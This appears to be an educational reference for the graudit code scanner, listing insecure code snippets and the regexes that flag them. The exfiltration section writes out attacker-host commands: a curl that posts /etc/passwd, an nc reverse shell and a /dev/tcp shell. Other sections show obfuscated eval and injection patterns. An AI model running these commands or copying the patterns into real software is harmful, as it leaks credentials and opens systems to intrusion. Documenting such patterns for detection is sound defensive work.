# Common Malicious Code Patterns

This document provides examples of malicious patterns that graudit can detect. These are for educational purposes to understand what the scanner looks for.

## Command Injection Patterns

### Python
```python
# DANGEROUS: Direct command execution with user input
os.system(user_input)
subprocess.call(shell=True, cmd=user_data)
eval(untrusted_string)
exec(code_from_network)
```

### JavaScript/Node.js
```javascript
// DANGEROUS: eval and child_process
eval(userInput);
child_process.exec(command + userControlled);
new Function(dynamicCode)();
```

### PHP
```php
// DANGEROUS: Command execution
system($_GET['cmd']);
exec($user_input);
shell_exec($_POST['command']);
passthru($untrusted);
```

### Bash
```bash
# DANGEROUS: Eval and indirect execution
eval "$user_input"
bash -c "$untrusted_var"
$(cat /tmp/user_script)
```

## SQL Injection Patterns

```python
# DANGEROUS: String concatenation in queries
cursor.execute("SELECT * FROM users WHERE id = " + user_id)
query = f"DELETE FROM {table} WHERE name = '{name}'"
```

```php
// DANGEROUS: Unparameterized queries
$sql = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";
mysql_query("INSERT INTO logs VALUES ('" . $user_data . "')");
```

## Cross-Site Scripting (XSS) Patterns

```javascript
// DANGEROUS: Direct HTML injection
document.innerHTML = userInput;
element.outerHTML = untrustedData;
document.write(location.search);
```

```php
// DANGEROUS: Unescaped output
echo $_GET['name'];
print $user_comment;
```

## Hardcoded Secrets

```python
# DANGEROUS: Hardcoded credentials
API_KEY = "sk-1234567890abcdef"
password = "admin123"
aws_secret = "AKIAIOSFODNN7EXAMPLE"
```

```javascript
// DANGEROUS: Embedded tokens
const TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxx";
const DB_PASSWORD = "production_password_123";
```

## Dangerous File Operations

```python
# DANGEROUS: Path traversal
open("/var/data/" + user_filename)
shutil.rmtree(user_path)
os.chmod(file_from_user, 0o777)
```

```php
// DANGEROUS: File inclusion
include($_GET['page']);
require($user_module);
```

## Network/Exfiltration Patterns

```python
# SUSPICIOUS: Reverse shell patterns
socket.connect(("attacker.com", 4444))
urllib.request.urlopen("http://evil.com?data=" + encoded_data)
```

```bash
# SUSPICIOUS: Data exfiltration
curl http://attacker.com/collect --data "$(cat /etc/passwd)"
nc -e /bin/bash attacker.com 4444
/dev/tcp/attacker.com/4444
```

## Obfuscation Patterns

```python
# SUSPICIOUS: Encoded/obfuscated execution
exec(base64.b64decode(encoded_payload))
eval(codecs.decode(obfuscated, 'rot13'))
```

```javascript
// SUSPICIOUS: String obfuscation
eval(atob(encodedString));
new Function(String.fromCharCode(102,117,110,99,116,105,111,110))();
```

## Deserialization Vulnerabilities

```python
# DANGEROUS: Insecure deserialization
pickle.loads(untrusted_data)
yaml.load(user_input)  # without Loader=SafeLoader
```

```java
// DANGEROUS: Object deserialization
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject();
```

---

## How Graudit Detects These

Graudit uses regex patterns to match these dangerous constructs. For example:

- `eval\s*\(` - Matches eval calls
- `exec\s*\(` - Matches exec calls
- `base64` - Flags potential encoding/obfuscation
- `socket\.connect` - Network connection attempts
- `SELECT.*FROM.*WHERE` with string interpolation - SQL injection

## Testing Your Scan

Create a test file with some of these patterns and run:

```bash
graudit -d python test_file.py
graudit -d secrets test_file.py
graudit -d exec test_file.py
```

Review the output to understand what graudit flags in your codebase.
